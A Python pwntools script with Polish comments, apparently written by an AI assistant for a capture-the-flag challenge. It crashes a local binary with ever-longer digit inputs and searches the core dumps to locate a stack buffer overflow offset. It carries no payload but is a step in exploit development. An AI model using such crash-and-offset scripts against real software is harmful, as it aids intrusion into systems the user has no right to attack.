#!/usr/bin/env python3
from pwn import *
import sys
import os

binary = './chal'   # <- zmień jeśli trzeba
maxlen = 500        # maksymalna długość którą sprawdzamy
digit = b'5'        # używaj tej cyfry (możesz zmienić na b'1' itp.)

context.binary = ELF(binary)

def try_length(n):
    # uruchom proces, przejdź przez imie i wyślij "wiek" = n cyfr
    p = process(binary)
    try:
        p.recvuntil(b"What's your name?")
        p.sendline(b"Bob")
        p.recvuntil(b"How old are you?")
        p.sendline(digit * n)
        # czekamy aż proces padnie lub zakończy
        p.wait(timeout=2)
    except (EOFError, Exception):
        # proces mógł się rozbić — ok
        pass

    # jeśli jest plik core w bieżącym katalogu -> użyjemy p.corefile
    try:
        core = p.corefile
    except Exception:
        # jeśli proces nadal działa, zabij i zrób core (rzadko)
        try:
            p.kill()
        except:
            pass
        return None, None

    # znajdź w pamięci core miejsce gdzie pojawia się sekwencja digit*n
    stack_ptr = core.rsp
    # czytamy rozumną ilość bajtów z top-of-stack (dostosuj jeśli trzeba)
    mem = core.read(stack_ptr, 0x800)
    pattern = digit * n
    idx = mem.find(pattern)
    if idx == -1:
        # spróbuj szukać też w regionie wyżej na stosie (większy zasięg)
        mem2 = core.read(stack_ptr - 0x1000, 0x2000)
        idx2 = mem2.find(pattern)
        if idx2 == -1:
            return core, None
        else:
            # offset od stack_ptr-0x1000
            found_addr = stack_ptr - 0x1000 + idx2
            return core, found_addr
    else:
        found_addr = stack_ptr + idx
        return core, found_addr

# pętla brute-force
for n in range(1, maxlen+1):
    print(f"[+] Testing length {n} ...", end='', flush=True)
    core, found_addr = try_length(n)
    if core is None:
        print(" process didn't produce core (or timed out).")
        continue
    if found_addr is None:
        print(" pattern not found in stack region.")
        continue

    print(" pattern found in core at 0x{:x}".format(found_addr))

    # Teraz musimy ustalić gdzie w stosie leży początek bufora (local_58).
    # Najprostsze: odczytaj adres pokazany w programie dla &local_58 (jeśli debugujesz)
    # Alternatywnie: obliczymy offset względem miejsca, które wygląda jak początek bufora:
    # załóżmy, że przesuńmy od found_addr w górę/na dół żeby znaleźć porównywalne miejsce.
    # Dla precyzji: pokażemy kilka kontekstowych hexdumpów i przerwiemy pętlę — użytkownik
    # otrzyma adres i będzie mógł policzyć offset ręcznie w gdb.
    print("[+] Core RSP: 0x{:x}".format(core.rsp))
    print("[+] Found pattern address: 0x{:x}".format(found_addr))
    # wypisz fragment pamięci wokół znalezionego miejsca (do ręcznej weryfikacji)
    off0 = max(found_addr - 0x40, 0)
    snippet = core.read(off0, 0x120)
    print("[+] Memory snippet (hex):")
    print(enhex(snippet))
    print("\n---\nTeraz możesz w gdb porównać ten adres z adresami zmiennych lokalnych (p &local_58, p &local_37).")
    print("Jeśli chcesz, mogę pomóc policzyć dokładny offset jeśli wkleisz tutaj")
    print(" - adres początku bufora (np. &local_58) lub")
    print(" - adres local_37 / miejsca które chcesz nadpisać (np. &local_37).")
    sys.exit(0)

print("[!] Nie znaleziono wzorca do długości maxlen =", maxlen)
